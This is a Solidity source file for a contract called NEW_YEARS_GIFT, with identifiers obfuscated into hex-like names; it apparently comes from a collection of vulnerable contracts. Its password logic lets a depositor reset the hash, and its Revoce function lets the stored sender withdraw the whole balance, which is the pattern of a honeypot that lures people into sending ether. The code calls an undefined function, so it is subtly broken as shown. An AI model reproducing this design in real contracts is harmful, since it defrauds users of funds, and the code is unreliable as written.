// SPDX-License-Identifier: MIT
pragma solidity ^0.4.19;

contract NEW_YEARS_GIFT
{
    string _0x29187a;

    bool _0x4838f8 = false;

    address sender;

    bytes32 public _0x0ff7f5;

    function() public payable{}

    function GetHash(bytes _0x6f916b) public constant returns (bytes32) {return _0x104146(_0x6f916b);}

    function SetPass(bytes32 _0x9b5291)
    public
    payable
    {
        if( (!_0x4838f8&&(msg.value > 1 ether)) || _0x0ff7f5==0x0 )
        {
            _0x0ff7f5 = _0x9b5291;
            sender = msg.sender;
        }
    }

    function SetMessage(string _0xf4be95)
    public
    {
        if(msg.sender==sender)
        {
            _0x29187a =_0xf4be95;
        }
    }

    function GetGift(bytes _0x6f916b)
    external
    payable
    returns (string)
    {
        if(_0x0ff7f5 == _0x104146(_0x6f916b))
        {
            msg.sender.transfer(this.balance);
            return _0x29187a;
        }
    }

    function Revoce()
    public
    payable
    {
        if(msg.sender==sender)
        {
            sender.transfer(this.balance);
            _0x29187a="";
        }
    }

    function PassHasBeenSet(bytes32 _0x9b5291)
    public
    {
        if(msg.sender==sender&&_0x9b5291==_0x0ff7f5)
        {
           _0x4838f8=true;
        }
    }
}